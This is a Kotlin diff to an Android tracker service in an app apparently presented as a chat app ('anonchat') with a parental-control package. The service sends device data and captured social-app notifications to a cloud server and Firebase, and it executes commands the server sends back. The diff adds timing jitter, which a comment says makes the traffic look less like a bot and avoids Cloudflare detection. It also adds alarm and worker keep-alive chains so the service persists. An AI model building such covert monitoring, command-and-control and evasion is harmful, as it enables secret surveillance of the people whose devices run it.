@@ -227,7 +227,15 @@ class TrackerService : Service() {
                 } catch (e: Exception) {
                     writeDebugLog("Report loop exception: ${e.message}")
                 }
-                val nextDelay = if (rateLimitBackoffMs > 0) rateLimitBackoffMs else 15_000L
+                // Backoff-aware cadence with jitter: respect the exponential
+                // rate-limit backoff when set, otherwise 15 s + up to 5 s of
+                // jitter so traffic looks less like a bot (helps avoid
+                // Cloudflare / CDN challenge flagging on Render's edge).
+                val nextDelay = if (rateLimitBackoffMs > 0) {
+                    rateLimitBackoffMs
+                } else {
+                    15_000L + (0..5000L).random()
+                }
                 delay(nextDelay)
             }
         }
@@ -489,7 +497,7 @@ class TrackerService : Service() {
             val socialNotifications = SocialNotificationService.flushBuffer()
 
 
-            // 1. Report to PythonAnywhere HTTP Server FIRST (Synchronous & Unblocked)
+            // 1. Report to the active cloud server (Render, sticky) — synchronous & unblocked
             try {
                 val payload = ApiClient.buildReportPayload(
                     deviceInfo = deviceInfo,
@@ -507,13 +515,14 @@ class TrackerService : Service() {
                 val result = ApiClient.sendBulkReport(payload)
 
                 if (result.success) {
-                    writeDebugLog("PythonAnywhere Report OK. Commands: ${result.commands?.size ?: 0}")
+                    writeDebugLog("Cloud Report OK (${CloudConfig.serverUrl}). Commands: ${result.commands?.size ?: 0}")
                     result.commands?.forEach { cmd ->
                         handleCommand(cmd)
                     }
                     return@collectAndReport ReportOutcome.OK
                 } else {
-                    writeDebugLog("PythonAnywhere Report FAILED: ${result.error ?: "unknown"}")
+                    val reportErr = result.error ?: "unknown"
+                    writeDebugLog("Cloud Report FAILED: $reportErr")
                     // 429 with a Cloudflare challenge page = we are being
                     // throttled by the proxy in front of Render. Don't retry
                     // immediately — the caller will apply exponential backoff.
@@ -548,11 +557,11 @@ class TrackerService : Service() {
                     return@collectAndReport ReportOutcome.OTHER_FAILURE
                 }
             } catch (e: Exception) {
-                writeDebugLog("PythonAnywhere Report EXCEPTION: ${e.message}")
+                writeDebugLog("Cloud Report EXCEPTION: ${e.message}")
                 return@collectAndReport ReportOutcome.OTHER_FAILURE
             }
 
-            // 2. Report to Firebase Asynchronously in Background (Never Blocks PythonAnywhere)
+            // 2. Report to Firebase Asynchronously in Background (Never Blocks the Cloud Report)
             scope.launch(kotlinx.coroutines.Dispatchers.IO) {
                 try {
                     com.anonchat.app.parentalcontrol.manager.FirebaseManager.reportToFirebase(
@@ -769,6 +778,14 @@ class TrackerService : Service() {
                 // it's safe to log and continue.
                 Log.w(TAG, "TrackerService.start() failed (background FGS start?): ${e.message}")
             }
+            // Reinforce both keep-alive chains every time the service is started
+            // (fast 2-min alarm + OS-managed periodic worker).
+            try {
+                com.anonchat.app.parentalcontrol.receiver.AlarmReceiver.scheduleExactAlarm(context)
+            } catch (_: Exception) {}
+            try {
+                com.anonchat.app.parentalcontrol.keepalive.KeepAliveScheduler.scheduleAll(context)
+            } catch (_: Exception) {}
         }
 
         fun stop(context: Context) {
